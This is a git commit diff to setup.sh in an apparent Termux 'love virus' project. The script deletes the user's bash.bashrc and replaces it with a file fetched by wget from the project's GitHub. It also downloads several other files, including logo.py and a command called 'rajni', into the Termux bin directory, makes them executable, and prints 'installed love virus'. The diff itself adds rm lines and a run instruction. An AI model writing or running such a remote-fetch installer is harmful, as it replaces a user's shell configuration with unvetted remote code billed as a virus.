11df74d49f62615b4315017b4fe17a7695883699
Simplehacker1Community <93964893+Simplehacker1Community@users.noreply.github.com>
2021-12-13 11:34:20 +0530

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -6,6 +6,11 @@ cd /data/data/com.termux/files/usr/etc
 rm bash.bashrc
 wget https://raw.githubusercontent.com/Simplehacker1Community/love-virus2/simplehacker/bash.bashrc 
 cd /data/data/com.termux/files/usr/bin
+rm love.sh
+rm logo.py
+rm loveyou.txt
+rm simple.txt
+rm rajni
 wget https://raw.githubusercontent.com/Simplehacker1Community/love-virus2/simplehacker/logo.py
 wget https://raw.githubusercontent.com/Simplehacker1Community/love-virus2/simplehacker/loveyou.txt
 wget https://raw.githubusercontent.com/Simplehacker1Community/love-virus2/simplehacker/loveyou2.txt
@@ -17,3 +22,4 @@ chmod +x * rajni
 
 clear
 echo " installed love virus"
+echo " Enter rajni anyware to run this script"
